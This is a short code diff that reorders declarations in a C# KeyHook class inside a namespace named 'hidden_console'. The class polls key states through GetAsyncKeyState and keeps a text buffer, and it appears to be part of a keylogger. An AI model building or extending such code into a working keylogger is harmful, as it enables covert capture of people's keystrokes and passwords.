@@ -9,10 +9,8 @@ namespace hidden_console
 {
     public static class KeyHook
     {
-        public static event KeyEventDelegate OnKeyDown;
-        public static event KeyEventDelegate OnKeyUp;
-        public delegate void KeyEventDelegate(Keys key);
-
+        [DllImport("user32.dll")]
+        private static extern short GetAsyncKeyState(Keys vKey);
         private static DateTime _ticks = DateTime.Now;
         private static Thread _pollingThread;
         private static string _buffer = string.Empty;
@@ -24,8 +22,9 @@ namespace hidden_console
             { Keys.Enter, "\r\n" }
         };
 
-        [DllImport("user32.dll")]
-        private static extern short GetAsyncKeyState(Keys vKey);
+        public static event KeyEventDelegate OnKeyDown;
+        public static event KeyEventDelegate OnKeyUp;
+        public delegate void KeyEventDelegate(Keys key);
 
         internal static void Initialize()
         {
